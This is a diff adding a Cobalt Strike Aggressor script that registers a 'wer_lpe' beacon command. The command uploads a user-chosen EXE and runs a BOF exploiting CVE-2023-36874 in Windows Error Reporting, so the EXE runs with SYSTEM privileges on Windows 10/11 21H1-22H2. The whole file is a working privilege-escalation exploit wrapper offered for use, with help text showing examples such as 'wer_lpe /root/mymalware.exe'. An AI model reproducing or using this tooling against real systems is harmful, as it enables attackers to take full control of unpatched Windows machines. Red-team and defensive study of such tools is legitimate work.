@@ -1,0 +1,92 @@
+alias wer_lpe
+{
+    local('$bid $barch $args $exebytes $reportbytes $payload $writabledir $data $output $filehash');
+
+    if (size(@_) < 2 || size(@_) > 3)
+    {
+        berror($1, "Incorrect usage!");
+        berror($1, beacon_command_detail("wer_lpe"));
+        return;
+    }
+
+    $bid = $1;
+    $barch  = barch($1);
+    $payload = $2;
+    $writabledir = $3;
+
+    if(!-exists $payload)
+    {    
+        berror($1, "Payload EXE: $2 does not seem to exist!");
+        exit();
+    }
+
+    if($barch ne "x64")
+    {
+        berror($1, "Architecture: only x64 is supported!")
+    }
+
+    #If a writable dir was provided and no trailing backslash present we are going to add one
+    if($writabledir ne "" && right($writabledir, 1) eq "\\")
+    {
+        $writabledir = left($writabledir, strlen($writabledir) - 1);
+    }
+
+    #Fetch MD5 Hash of payload that will be written to disk for logging purposes
+    $data = exec("md5sum " . $payload);
+    $output = readln($data);
+    $filehash = split(" ",$output, 2)[0];
+
+    #read in the Exe payload
+    $handle = openf($payload);
+    $exebytes = readb($handle, -1);
+    closef($handle);
+
+    #read in the Report.wer file
+    $handle = openf(script_resource("Report.wer"));
+    $reportbytes  = readb($handle, -1);
+    closef($handle);
+
+    # read in the right BOF file
+    $handle = openf(script_resource("wer_lpe. $+ $barch $+ .o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # Pack the arguments
+    $args = bof_pack($bid, "bbZ", $reportbytes, $exebytes, $writabledir);
+
+    # Announce what we are doing
+    blog2($bid, "Uploading $payload \(MD5Sum: $filehash\) and running CVE-2023-36874 WER LPE!");
+
+    # Execute BOF
+    beacon_inline_execute($bid, $data, "go", $args);
+}
+
+
+beacon_command_register(
+    "wer_lpe",
+    "CVE-2023-36874 Windows Error Reporting LPE for Windows 10/11 21H1-22H2",
+	"
+Command: wer_lpe
+Summary: This BOF will drop a user-specified EXE to disk on the target
+         machine and trigger an exploit in the Windows Error Reporting
+         service, resulting in the EXE being ran with SYSTEM privileges. 
+         This version of the exploit works on Win 10/11 21H1-22H2.
+         This vulnerability was patched in the July 2023 monthly security
+         update.
+         
+Usage:   wer_lpe <EXE to upload> [writable folder]
+
+	        EXE to upload          - The full path to the EXE on the attack machine that you want to upload.
+                 writable target folder - Optional. A writable folder on the target system to drop the EXE
+                                          payload to. If no folder is specified, wer_lpe will attempt to 
+                                          use the current directory.
+Example:
+         wer_lpe /root/mymalware.exe
+         wer_lpe /root/mymalware.exe c:\\users\\tom\\appdata
+         wer_lpe /root/mymalware.exe \"c:\\users\\tom\\my folder with spaces\"
+
+
+Note:   - This BOF will attempt to clean up the artifacts dropped on target; Pay attention to 
+          the output to determine if you need to manually clean something up!
+"
+); 
